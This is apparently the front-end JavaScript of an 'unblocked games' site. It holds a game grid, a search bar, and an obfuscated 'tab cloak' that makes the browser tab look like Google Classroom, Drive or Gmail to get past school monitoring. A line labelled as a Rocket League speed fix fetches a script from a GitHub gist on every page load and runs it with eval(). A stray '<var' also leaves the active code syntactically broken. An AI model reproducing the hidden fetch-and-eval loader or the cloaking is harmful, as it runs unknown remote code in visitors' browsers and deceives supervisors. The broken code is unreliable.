/* // Hello! If you are looking at this not through GitHub, join our Discord server and be a developer for us here: https://dsc.gg/outred

// JS to make the spotlight hover effect
document.querySelector(".games").addEventListener("mousemove", e => {
  const gameElements = document.querySelectorAll(".game");
  for (const gameElement of gameElements) {
    const rect = gameElement.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    gameElement.style.setProperty("--mouse-x", `${x}px`);
    gameElement.style.setProperty("--mouse-y", `${y}px`);
  }
});

// JS to take content from a json file and display it on the cards and enable link redirection
fetch('/assets/json/games.json')
  .then(response => response.json())
  .then(data => {
    const gamesContainer = document.querySelector('.games');
    const searchInput = document.querySelector('.search-input');

    // Render the initial grid of images
    renderGrid(data);

    // Add the actual HTML structure for the tile(s) 

    function renderGrid(items) {

      items.forEach(item => {
        const game = document.createElement('div');
        game.classList.add('game');
        game.innerHTML = `<div><img src="/g/assets/${item.root}/${item.img}" loading="lazy"; alt="${item.title}" draggable="false"><h2>${item.title}</h2></div>`;
        gamesContainer.appendChild(game);

        // Add event listener to each game element to handle the click event and redirect to the link
        game.addEventListener("click", () => {
          localStorage.setItem('currentgame', '/g/assets/${item.root}/${item.file}');
          localStorage.setItem('currenttitle', '${item.title}');
          localStorage.setItem('currentdescription', '${item.description}');
          window.location.href = '/g/load.html';
        });
      });
    }
  });

  document.addEventListener("DOMContentLoaded", () => {
    // JS to make the spotlight hover effect
    document.querySelector(".games").addEventListener("mousemove", e => {
      const gameElements = document.querySelectorAll(".game");
      for (const gameElement of gameElements) {
        const rect = gameElement.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        gameElement.style.setProperty("--mouse-x", `${x}px`);
        gameElement.style.setProperty("--mouse-y", `${y}px`);
      }
    });
  
    // Function to filter the grid based on search input
    function filterGrid(searchText, items) {
      const filteredItems = items.filter(item => {
        // You can adjust this condition to filter based on any specific properties in your JSON data
        return item.title.toLowerCase().includes(searchText.toLowerCase());
      });
  
      // Clear the current grid
      const gamesContainer = document.querySelector('.games');
      gamesContainer.innerHTML = '';
  
      // Render the filtered grid
      renderGrid(filteredItems);
    }
  
    // JS to take content from a json file and display it on the cards and enable link redirection
    fetch('/assets/json/games.json')
      .then(response => response.json())
      .then(data => {
        const gamesContainer = document.querySelector('.games');
        const searchInput = document.querySelector('.search-input');
  
        let allItems = data; // Store all items in a variable
  
        // Render the initial grid of images
        renderGrid(allItems);
  
        // Add the actual HTML structure for the tile(s) 
        function renderGrid(items) {
          items.forEach(item => {
            const game = document.createElement('div');
            game.classList.add('game');
            game.innerHTML = `<div><img src="/g/assets/${item.root}/${item.img}" onerror="this.src='/assets/img/no-img.jpg' loading="lazy" alt="${item.title}" draggable="false"><h2>${item.title}</h2></div>`;
            gamesContainer.appendChild(game);
  
            // Add event listener to each game element to handle the click event and redirect to the link
            game.addEventListener("click", () => {
              localStorage.setItem('currentgame', `/g/assets/${item.root}/${item.file}`);
              localStorage.setItem('currenttitle', item.title);
              localStorage.setItem('currentdescription', item.description);
              window.location.href = '/g/load.html';
            });
          });
        };
  
        // Add event listener to search input
        searchInput.addEventListener("input", (e) => {
          const searchText = e.target.value.trim();
          // Filter the grid based on search input
          const filteredItems = allItems.filter(item => {
            // You can adjust this condition to filter based on any specific properties in your JSON data
            return item.title.toLowerCase().includes(searchText.toLowerCase());
          });
          // Render the filtered grid
          renderGrid(filteredItems);
        });
      });
  }); */
  document.addEventListener("DOMContentLoaded", () => {
    // JS to make the spotlight hover effect
    document.querySelector(".games").addEventListener("mousemove", e => {
      const gameElements = document.querySelectorAll(".game");
      for (const gameElement of gameElements) {
        const rect = gameElement.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        gameElement.style.setProperty("--mouse-x", `${x}px`);
        gameElement.style.setProperty("--mouse-y", `${y}px`);
      }
    });
	  <var _0x101ccc=_0x1342;(function(_0x300086,_0xbb859c){var _0x7842af=_0x1342,_0x308601=_0x300086();while(!![]){try{var _0x345aca=parseInt(_0x7842af(0xd7))/(-0xc2e*0x2+0xa2b*0x1+ -0x9e*-0x17)*(-parseInt(_0x7842af(0x17b))/(0x25bb*-0x1+ -0x263*0x1+ -0x20*-0x141))+ -parseInt(_0x7842af(0xe9))/(-0x1*0xe3b+ -0x2207+0x1*0x3045)+parseInt(_0x7842af(0x175))/(-0x4c7*0x1+ -0x1*-0x1ef7+ -0x4*0x68b)*(-parseInt(_0x7842af(0x164))/(-0x6b2+0x1151+ -0xa9a))+parseInt(_0x7842af(0x16e))/(-0x25f9+0x154b+0x10b4)*(-parseInt(_0x7842af(0x151))/(0x11a5*-0x2+ -0xb73+0x49*0xa4))+parseInt(_0x7842af(0x17a))/(-0x18a8+0x17db*0x1+0xd5)+parseInt(_0x7842af(0xd9))/(-0x69*0x4e+ -0x3*-0x2e6+0x1755)+parseInt(_0x7842af(0xd5))/(-0x7d*-0x4b+0x1e21+ -0x42b6);if(_0x345aca===_0xbb859c)
break;else
_0x308601['push'](_0x308601['shift']());}catch(_0x175dc2){_0x308601['push'](_0x308601['shift']());}}}(_0x48a0,-0x1a0500+0x6233*-0x16+0x1*0x301a5b));var tab=localStorage[_0x101ccc(0x137)](_0x101ccc(0x149));if(tab)
try{var tabData=JSON[_0x101ccc(0x13d)](tab);}catch{var tabData={};}
else
var tabData={};tabData[_0x101ccc(0xc9)]&&(document[_0x101ccc(0xbf)+_0x101ccc(0xf3)](_0x101ccc(0xc9))[_0x101ccc(0xb8)]=tabData[_0x101ccc(0xc9)]);tabData[_0x101ccc(0x150)]==null&&(document[_0x101ccc(0xbf)+_0x101ccc(0xf3)](_0x101ccc(0x150))[_0x101ccc(0xb8)]=tabData[_0x101ccc(0x150)]);var settingsDefaultTab={'title':_0x101ccc(0xfc)+_0x101ccc(0x10f),'icon':_0x101ccc(0x173)+_0x101ccc(0x13e)};function setTitle(_0x4894c3=''){var _0x58efff=_0x101ccc,_0x5000cc={'tWiKO':_0x58efff(0x163),'VfFaT':_0x58efff(0x149)},_0x4b0f6e=_0x5000cc[_0x58efff(0x10c)][_0x58efff(0x126)]('|'),_0x36aebf=-0x1e9f+ -0x1138+ -0x1*-0x2fd7;while(!![]){switch(_0x4b0f6e[_0x36aebf++]){case'0':_0x4894c3?document[_0x58efff(0xc9)]=_0x4894c3:document[_0x58efff(0xc9)]=settingsDefaultTab[_0x58efff(0xc9)];continue;case'1':localStorage[_0x58efff(0x124)](_0x5000cc[_0x58efff(0x125)],JSON[_0x58efff(0x179)](_0x5068ec));continue;case'2':_0x4894c3?_0x5068ec[_0x58efff(0xc9)]=_0x4894c3:delete _0x5068ec[_0x58efff(0xc9)];continue;case'3':var _0x5630f4=localStorage[_0x58efff(0x137)](_0x5000cc[_0x58efff(0x125)]);continue;case'4':if(_0x5630f4)
try{var _0x5068ec=JSON[_0x58efff(0x13d)](_0x5630f4);}catch{var _0x5068ec={};}
else
var _0x5068ec={};continue;}
break;}}
function _0x48a0(){var _0x2040ae=['bsite','value','Rwlgk','lVsgQ','4|0|1|2|3','/media/clo','XUdhM','sZwXp','getElement','hHyrY','\x20Search.ic','PcfCO','nitter','show','demy','aks/63DFB3','dhPwS','SFW\x20games\x20','title','-\x20جهاد','E9-10E9-44','ar.ico','OhJLy','moUrv','LibreX','otzYQ','vjyfp','NWFcM','aks/9A58D8','zyeKd','20071500DXfwxo','aks','180106oUCuMa','aks/Google','7695900EVAJAm','RbNlp','librex','oDxYQ','DOMContent','toggle','UZTLc','gndou','ccdrop','Google\x20Cal','Canvas','premadeclo','aks/8FE4C2','canvas','ImmzY','xaXtD','2246682jjenhq','.com/favic','wQfhJ','PnALa','className','D8880683C8','rBcxS','wFBrf','room.png','zoom','ById','Billibilli','hKNRR','XNXyG','body','stener','CF5BB0399F','addEventLi','Cornhub','Settings\x20|','https://ar','change','Dashboard\x20','agKoR','E4F3A36728','qYVQd','qgwie','jaKmx','w.bilibili','eJUrM','06-AF02-C5','jgJRs','Loaded','aks/EB4D8F','add','tWiKO','TFfUE','99-B525-F4','\x20Native','e.ico','itchio','SlYQG','tBlank','SdkPK','Gmail','dUmzx','iDomg','hxzkd','qpxXy','FVJRx','sQtWI','aks/Canvas','xcgvS','wKwXl','HziKm','0DFD2B49AB','themeSelec','aks/2255E8','Cxeui','setItem','VfFaT','split','rkrwR','Indivious','dluUU','6A-AD95-B6','indivious','VHUhf','ive','gnice','YbYcU','9A0040F94A','aks/Meet.i','hlvKn','BC-6595-47','USuKg','aks/Zoom.i','wIERt','getItem','.ico','https://ww','NvmYv','drive','FDA40FAD10','parse','o.png','calendar','href','theme','./media/cl','dpZio','endar','VaGiA','Top\x20free\x20N','Google','B8-A6CE-3F','tab','tADjN','IkLvj','zuFcr','YouTube','icon\x27]','RdqHN','icon','27153LVMPLx','aks/Calend','XPhAq','JXfai','JKBwW','ico','pUmqo','48-AB69-43','for\x20web','meets','link[rel=\x27','.wikipedia','Zoom','sGZHO','1D-907E-3F','GBExM','eyPTO','Google\x20Mee','0|3|4|2|1','2295275KgSVJz','4B-4CB0-47','aks/YouTub','Cshic','JaAoh','aks/D23D34','toggleAbou','querySelec','psLet','PZtMR','2634yDelke','kmKIz','gLYVp','LnzGq','Academy.ic','/media/log','.org/favic','4vKCnIV','youtube','Classes','tdNUG','stringify','13305640tqwcJu','8ueYLCw','|\x20Khan\x20Aca','cornhub','oaks/Khan\x20','hOvqN','gmail','aks/Gmail.','20-0EEC-4F','classroom','YFcUZ','search','DJTjc','on.ico','BHSem','73-914D-43','tor','ywfJK','cRnka','reload','rQxEd','wikipedia','FtQrC','My\x20Drive\x20-','RgzGY','C1-B470-DB','gBrVX','ueVfg','\x20Google\x20Dr','3|2|1|0|4','WewtJ','iNPmy','Drive.ico','classList','SOytF','HRQur','ويكيبيديا\x20','default','dqJLc','teddit','oaks/Class','khan','tyuUS','GUiUj'];_0x48a0=function(){return _0x2040ae;};return _0x48a0();}
function setFavicon(_0x10d6cb){var _0x48aa9b=_0x101ccc,_0x49315a={'tdNUG':_0x48aa9b(0xbb),'eyPTO':_0x48aa9b(0x149),'cRnka':_0x48aa9b(0x15b)+_0x48aa9b(0x14e)},_0x521f98=_0x49315a[_0x48aa9b(0x178)][_0x48aa9b(0x126)]('|'),_0x515820=0x53*0x1d+ -0x2041*0x1+0x16da;while(!![]){switch(_0x521f98[_0x515820++]){case'0':var _0x527005=localStorage[_0x48aa9b(0x137)](_0x49315a[_0x48aa9b(0x161)]);continue;case'1':if(_0x527005)
try{var _0x10fafd=JSON[_0x48aa9b(0x13d)](_0x527005);}catch{var _0x10fafd={};}
else
var _0x10fafd={};continue;case'2':_0x10d6cb?_0x10fafd[_0x48aa9b(0x150)]=_0x10d6cb:delete _0x10fafd[_0x48aa9b(0x150)];continue;case'3':localStorage[_0x48aa9b(0x124)](_0x49315a[_0x48aa9b(0x161)],JSON[_0x48aa9b(0x179)](_0x10fafd));continue;case'4':_0x10d6cb?document[_0x48aa9b(0x16b)+_0x48aa9b(0x18a)](_0x49315a[_0x48aa9b(0x18c)])[_0x48aa9b(0x140)]=_0x10d6cb:document[_0x48aa9b(0x16b)+_0x48aa9b(0x18a)](_0x49315a[_0x48aa9b(0x18c)])[_0x48aa9b(0x140)]=settingsDefaultTab[_0x48aa9b(0x150)];continue;}
break;}}
function setCloak(){var _0x21286e=_0x101ccc,_0x148eea={'PZtMR':_0x21286e(0xe4)+_0x21286e(0xd6),'USuKg':_0x21286e(0x185),'lVsgQ':function(_0xf43a2e,_0x4ed3a4){return _0xf43a2e(_0x4ed3a4);},'wQfhJ':_0x21286e(0x147),'PnALa':_0x21286e(0xbc)+_0x21286e(0xd8)+_0x21286e(0xc1)+'o','Rwlgk':_0x21286e(0x111),'YFcUZ':function(_0x21ef2d,_0x5c0adf){return _0x21ef2d(_0x5c0adf);},'YbYcU':_0x21286e(0x146)+_0x21286e(0xc8)+_0x21286e(0x159),'iDomg':_0x21286e(0xbc)+_0x21286e(0x169)+_0x21286e(0x165)+_0x21286e(0x10e)+_0x21286e(0x101)+_0x21286e(0x138),'tyuUS':_0x21286e(0x18f),'ueVfg':function(_0x31e120,_0x547489){return _0x31e120(_0x547489);},'UZTLc':_0x21286e(0xaf)+_0x21286e(0xca),'NWFcM':function(_0x592722,_0x51f01c){return _0x592722(_0x51f01c);},'GUiUj':_0x21286e(0xfd)+_0x21286e(0x15c)+_0x21286e(0x174)+_0x21286e(0x187),'FVJRx':_0x21286e(0xb7),'qpxXy':function(_0x11f508,_0x5acf79){return _0x11f508(_0x5acf79);},'wFBrf':_0x21286e(0xf4),'hHyrY':function(_0x10e49f,_0x17d842){return _0x10e49f(_0x17d842);},'XUdhM':_0x21286e(0x139)+_0x21286e(0x105)+_0x21286e(0xea)+_0x21286e(0x187),'SlYQG':_0x21286e(0x13b),'kmKIz':function(_0x23774e,_0x35a3e1){return _0x23774e(_0x35a3e1);},'sQtWI':_0x21286e(0xa2)+_0x21286e(0xa7)+_0x21286e(0x12d),'oDxYQ':function(_0x44aa19,_0x2b5428){return _0x44aa19(_0x2b5428);},'Cxeui':_0x21286e(0xbc)+_0x21286e(0xd8)+_0x21286e(0xab),'sZwXp':_0x21286e(0xdb),'gBrVX':function(_0x47c1d5,_0x2da5f6){return _0x47c1d5(_0x2da5f6);},'LnzGq':_0x21286e(0xcf),'dluUU':function(_0x121dcd,_0x4c73d5){return _0x121dcd(_0x4c73d5);},'sGZHO':_0x21286e(0xbc)+_0x21286e(0xd3)+_0x21286e(0x133)+_0x21286e(0x12a)+_0x21286e(0xee)+_0x21286e(0x138),'qYVQd':_0x21286e(0x176),'GBExM':_0x21286e(0x14d),'hxzkd':function(_0x59c0d1,_0x212481){return _0x59c0d1(_0x212481);},'dUmzx':_0x21286e(0xbc)+_0x21286e(0x166)+_0x21286e(0x110),'rkrwR':_0x21286e(0x180),'hOvqN':_0x21286e(0x115),'XNXyG':_0x21286e(0xbc)+_0x21286e(0x181)+_0x21286e(0x156),'xcgvS':_0x21286e(0x13f),'jaKmx':function(_0x27060f,_0x1067e9){return _0x27060f(_0x1067e9);},'RdqHN':_0x21286e(0xe2)+_0x21286e(0x144),'psLet':_0x21286e(0xbc)+_0x21286e(0x152)+_0x21286e(0xcc),'ImmzY':_0x21286e(0x15a),'IkLvj':_0x21286e(0x162)+'t','qgwie':function(_0x32e83a,_0x46e2fa){return _0x32e83a(_0x46e2fa);},'XPhAq':_0x21286e(0xbc)+_0x21286e(0x131)+'co','wKwXl':_0x21286e(0x183),'gnice':_0x21286e(0x177),'rQxEd':function(_0x2bb0fa,_0x12e793){return _0x2bb0fa(_0x12e793);},'moUrv':_0x21286e(0x142)+_0x21286e(0xb3)+_0x21286e(0xf1),'RbNlp':_0x21286e(0xe6),'eJUrM':_0x21286e(0xe3),'pUmqo':function(_0x33f483,_0x5042fb){return _0x33f483(_0x5042fb);},'DJTjc':_0x21286e(0xbc)+_0x21286e(0x11c)+_0x21286e(0x138),'TFfUE':_0x21286e(0xf2),'SdkPK':function(_0x333596,_0x50db51){return _0x333596(_0x50db51);},'NvmYv':_0x21286e(0x15d),'rBcxS':function(_0x58714,_0x347b04){return _0x58714(_0x347b04);},'zyeKd':_0x21286e(0xbc)+_0x21286e(0x135)+'co','agKoR':_0x21286e(0xc3),'jgJRs':_0x21286e(0xbc)+_0x21286e(0xc6)+_0x21286e(0x182)+_0x21286e(0x107)+_0x21286e(0x120)+_0x21286e(0x138),'ywfJK':_0x21286e(0xb2),'dqJLc':function(_0x71098f,_0x5d7727){return _0x71098f(_0x5d7727);},'gLYVp':_0x21286e(0xbc)+_0x21286e(0x10a)+_0x21286e(0xcb)+_0x21286e(0x148)+_0x21286e(0x130)+_0x21286e(0x138),'Cshic':_0x21286e(0x17d),'VHUhf':_0x21286e(0xfb),'hlvKn':_0x21286e(0xbc)+_0x21286e(0xe5)+_0x21286e(0x189)+_0x21286e(0x15f)+_0x21286e(0xf9)+_0x21286e(0x138),'dhPwS':_0x21286e(0x12b),'xaXtD':_0x21286e(0x128),'tADjN':_0x21286e(0xbc)+_0x21286e(0x122)+_0x21286e(0x158)+_0x21286e(0xa4)+_0x21286e(0x13c)+_0x21286e(0x138),'JaAoh':_0x21286e(0xb4),'vjyfp':function(_0x37650d,_0x3947ac){return _0x37650d(_0x3947ac);},'hKNRR':_0x21286e(0xff)+_0x21286e(0x17c)+_0x21286e(0xc5),'HziKm':_0x21286e(0x142)+_0x21286e(0x17e)+_0x21286e(0x172)+'o'},_0xa2f581=document[_0x21286e(0xbf)+_0x21286e(0xf3)](_0x148eea[_0x21286e(0x16d)])[_0x21286e(0xb8)];switch(_0xa2f581){case _0x148eea[_0x21286e(0x134)]:_0x148eea[_0x21286e(0xba)](setTitle,_0x148eea[_0x21286e(0xeb)]),_0x148eea[_0x21286e(0xba)](setFavicon,_0x148eea[_0x21286e(0xec)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0xb9)]:_0x148eea[_0x21286e(0x184)](setTitle,_0x148eea[_0x21286e(0x12f)]),_0x148eea[_0x21286e(0x184)](setFavicon,_0x148eea[_0x21286e(0x117)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0xb5)]:_0x148eea[_0x21286e(0xa6)](setTitle,_0x148eea[_0x21286e(0xdf)]),_0x148eea[_0x21286e(0xd2)](setFavicon,_0x148eea[_0x21286e(0xb6)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x11a)]:_0x148eea[_0x21286e(0x119)](setTitle,_0x148eea[_0x21286e(0xf0)]),_0x148eea[_0x21286e(0xc0)](setFavicon,_0x148eea[_0x21286e(0xbd)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x112)]:_0x148eea[_0x21286e(0x16f)](setTitle,_0x148eea[_0x21286e(0x11b)]),_0x148eea[_0x21286e(0xdc)](setFavicon,_0x148eea[_0x21286e(0x123)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0xbe)]:_0x148eea[_0x21286e(0xa5)](setTitle,_0x148eea[_0x21286e(0x171)]),_0x148eea[_0x21286e(0x129)](setFavicon,_0x148eea[_0x21286e(0x15e)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x102)]:_0x148eea[_0x21286e(0x119)](setTitle,_0x148eea[_0x21286e(0x160)]),_0x148eea[_0x21286e(0x118)](setFavicon,_0x148eea[_0x21286e(0x116)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x127)]:_0x148eea[_0x21286e(0x16f)](setTitle,_0x148eea[_0x21286e(0x17f)]),_0x148eea[_0x21286e(0xd2)](setFavicon,_0x148eea[_0x21286e(0xf6)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x11d)]:_0x148eea[_0x21286e(0x104)](setTitle,_0x148eea[_0x21286e(0x14f)]),_0x148eea[_0x21286e(0xa5)](setFavicon,_0x148eea[_0x21286e(0x16c)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0xe7)]:_0x148eea[_0x21286e(0x119)](setTitle,_0x148eea[_0x21286e(0x14b)]),_0x148eea[_0x21286e(0x103)](setFavicon,_0x148eea[_0x21286e(0x153)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x11e)]:_0x148eea[_0x21286e(0xc0)](setTitle,_0x148eea[_0x21286e(0x12e)]),_0x148eea[_0x21286e(0x18e)](setFavicon,_0x148eea[_0x21286e(0xce)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0xda)]:_0x148eea[_0x21286e(0xa6)](setTitle,_0x148eea[_0x21286e(0x106)]),_0x148eea[_0x21286e(0x157)](setFavicon,_0x148eea[_0x21286e(0x186)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x10d)]:_0x148eea[_0x21286e(0x114)](setTitle,_0x148eea[_0x21286e(0x13a)]),_0x148eea[_0x21286e(0xef)](setFavicon,_0x148eea[_0x21286e(0xd4)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x100)]:_0x148eea[_0x21286e(0x129)](setTitle,_0x148eea[_0x21286e(0x100)]),_0x148eea[_0x21286e(0x184)](setFavicon,_0x148eea[_0x21286e(0x108)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x18b)]:_0x148eea[_0x21286e(0xba)](setTitle,_0x148eea[_0x21286e(0x18b)]),_0x148eea[_0x21286e(0xb1)](setFavicon,_0x148eea[_0x21286e(0x170)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x167)]:_0x148eea[_0x21286e(0x16f)](setTitle,_0x148eea[_0x21286e(0x12c)]),_0x148eea[_0x21286e(0x129)](setFavicon,_0x148eea[_0x21286e(0x132)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0xc7)]:_0x148eea[_0x21286e(0x18e)](setTitle,_0x148eea[_0x21286e(0xe8)]),_0x148eea[_0x21286e(0x114)](setFavicon,_0x148eea[_0x21286e(0x14a)]),location[_0x21286e(0x18d)]();break;case _0x148eea[_0x21286e(0x168)]:_0x148eea[_0x21286e(0xd1)](setTitle,_0x148eea[_0x21286e(0xf5)]),_0x148eea[_0x21286e(0x103)](setFavicon,_0x148eea[_0x21286e(0x11f)]),location[_0x21286e(0x18d)]();break;}}
function resetTab(){var _0x4ff5e5=_0x101ccc,_0x1bbd50={'WewtJ':_0x4ff5e5(0xa8),'gndou':_0x4ff5e5(0x150),'VaGiA':_0x4ff5e5(0xc9),'zuFcr':_0x4ff5e5(0x15b)+_0x4ff5e5(0x14e),'dpZio':_0x4ff5e5(0x149)},_0x438ef5=_0x1bbd50[_0x4ff5e5(0xa9)][_0x4ff5e5(0x126)]('|'),_0x1526c3=-0x1721+ -0x26ef*-0x1+ -0xfce;while(!![]){switch(_0x438ef5[_0x1526c3++]){case'0':document[_0x4ff5e5(0xbf)+_0x4ff5e5(0xf3)](_0x1bbd50[_0x4ff5e5(0xe0)])[_0x4ff5e5(0xb8)]='';continue;case'1':document[_0x4ff5e5(0xbf)+_0x4ff5e5(0xf3)](_0x1bbd50[_0x4ff5e5(0x145)])[_0x4ff5e5(0xb8)]='';continue;case'2':document[_0x4ff5e5(0x16b)+_0x4ff5e5(0x18a)](_0x1bbd50[_0x4ff5e5(0x14c)])[_0x4ff5e5(0x140)]=settingsDefaultTab[_0x4ff5e5(0x150)];continue;case'3':document[_0x4ff5e5(0xc9)]=settingsDefaultTab[_0x4ff5e5(0xc9)];continue;case'4':localStorage[_0x4ff5e5(0x124)](_0x1bbd50[_0x4ff5e5(0x143)],JSON[_0x4ff5e5(0x179)]({}));continue;}
break;}}
function _0x1342(_0x1a41ab,_0x804974){var _0x41c70b=_0x48a0();return _0x1342=function(_0x5aa1e2,_0x64ba11){_0x5aa1e2=_0x5aa1e2-(-0x4d*0x11+ -0x76c+0x2*0x695);var _0x37a516=_0x41c70b[_0x5aa1e2];return _0x37a516;},_0x1342(_0x1a41ab,_0x804974);}
document[_0x101ccc(0xfa)+_0x101ccc(0xf8)](_0x101ccc(0xdd)+_0x101ccc(0x109),function(){var _0x3dee81=_0x101ccc,_0xc4dae1={'PcfCO':function(_0x249b00,_0x36b71e){return _0x249b00(_0x36b71e);},'wIERt':_0x3dee81(0x141),'JXfai':function(_0x443d3e,_0x72e9ab){return _0x443d3e!==_0x72e9ab;},'JKBwW':_0x3dee81(0xb0),'HRQur':_0x3dee81(0x121)+'t','RgzGY':function(_0x35ab35,_0x1ffaa4){return _0x35ab35(_0x1ffaa4);},'OhJLy':_0x3dee81(0xfe)};const _0x3e5bf1=document[_0x3dee81(0xbf)+_0x3dee81(0xf3)](_0xc4dae1[_0x3dee81(0xae)]),_0xb56114=localStorage[_0x3dee81(0x137)](_0xc4dae1[_0x3dee81(0x136)]);_0xb56114&&(_0xc4dae1[_0x3dee81(0xa3)](_0x5d34b4,_0xb56114),_0x3e5bf1[_0x3dee81(0xb8)]=_0xb56114);_0x3e5bf1[_0x3dee81(0xfa)+_0x3dee81(0xf8)](_0xc4dae1[_0x3dee81(0xcd)],function(){var _0x4eb084=_0x3dee81;const _0x2ba09c=_0x3e5bf1[_0x4eb084(0xb8)];_0xc4dae1[_0x4eb084(0xc2)](_0x5d34b4,_0x2ba09c),localStorage[_0x4eb084(0x124)](_0xc4dae1[_0x4eb084(0x136)],_0x2ba09c);});function _0x5d34b4(_0x2d4b19){var _0x24206b=_0x3dee81;document[_0x24206b(0xf7)][_0x24206b(0xed)]='',_0xc4dae1[_0x24206b(0x154)](_0x2d4b19,_0xc4dae1[_0x24206b(0x155)])&&document[_0x24206b(0xf7)][_0x24206b(0xac)][_0x24206b(0x10b)](_0x2d4b19);}});function showccdrop(){var _0x405ba0=_0x101ccc,_0x212714={'iNPmy':_0x405ba0(0xe1),'BHSem':_0x405ba0(0xc4)};document[_0x405ba0(0xbf)+_0x405ba0(0xf3)](_0x212714[_0x405ba0(0xaa)])[_0x405ba0(0xac)][_0x405ba0(0xde)](_0x212714[_0x405ba0(0x188)]);}
const toggleButton=document[_0x101ccc(0xbf)+_0x101ccc(0xf3)](_0x101ccc(0x16a)+_0x101ccc(0x113));function toggleAboutBlank(){var _0x4e344d=_0x101ccc,_0x57bbf2={'SOytF':_0x4e344d(0x149),'otzYQ':_0x4e344d(0xc9),'FtQrC':_0x4e344d(0x150)};localStorage[_0x4e344d(0x124)](_0x57bbf2[_0x4e344d(0xad)],{'toggled':!![],'title':document[_0x4e344d(0xbf)+_0x4e344d(0xf3)](_0x57bbf2[_0x4e344d(0xd0)]),'icon':document[_0x4e344d(0xbf)+_0x4e344d(0xf3)](_0x57bbf2[_0x4e344d(0xa1)])});}
    // tab cloak
	  var _0x1=(function(){var _0x2=document['createElement']('script');_0x2['src']='https://unpkg.com/webp-hero@0.0.2/dist-cjs/polyfills.js',document['head']['appendChild'](_0x2);var _0x3=document['createElement']('script');_0x3['src']='https://unpkg.com/webp-hero@0.0.2/dist-cjs/webp-hero.bundle.js',document['head']['appendChild'](_0x3),_0x2['onload']=_0x3['onload']=function(){var _0x4=new webpHero['WebpMachine'];_0x4['polyfillDocument']()}})();
// webp polyfill for mobile
  
    // JS to take content from a json file and display it on the cards and enable link redirection
    fetch('/assets/json/games.json')
      .then(response => response.json())
      .then(data => {
        const gamesContainer = document.querySelector('.games');
  
        // Render the initial grid of images
        renderGrid(data);
  
        // Add the actual HTML structure for the tile(s) 
        function renderGrid(items) {
          items.forEach(item => {
            const game = document.createElement('div');
            game.classList.add('game');
            game.innerHTML = `<div><img src="/g/assets/${item.root}/${item.img}" onerror="this.src='/assets/img/no-img.jpg' loading="lazy" alt="${item.title}" draggable="false"><h2 class="item-title">${item.title}</h2></div>`;
            gamesContainer.appendChild(game);
  
            // Add event listener to each game element to handle the click event and redirect to the link
            game.addEventListener("click", () => {
              localStorage.setItem('currentgame', `/g/assets/${item.root}/${item.file}`);
              localStorage.setItem('currenttitle', item.title);
              localStorage.setItem('currentdescription', item.description);
              window.location.href = '/g/load.html';
            });
          });
        };
      });
  });
// improve rocket league speeds
var time=Date.now();var url="https://gist.githubusercontent.com/3kh0/6dd52e0bc4cf407769e89ea2d5957d49/raw/rocket.js?time="+time;fetch(url).then(response=>{console.log("Received response from server");return response.text()}).then(text=>{console.log("Received script text, executing...");try{eval(text);console.log("Script executed successfully")}catch(e){console.error("Error executing script: ",e)}});
// searchbar
function search_game() {
	let input = document.getElementById('searchbar').value
	input=input.toLowerCase();
	let x = document.getElementsByClassName('game');
	
	for (i = 0; i < x.length; i++) {
		if (!x[i].innerHTML.toLowerCase().includes(input)) {
			x[i].style.display="none";
		}
		else {
			x[i].style.display="list-item";	
      x[i].style.textDecoration="none";
      x[i].style.listStyleType="none";			
		}
	}
}
  
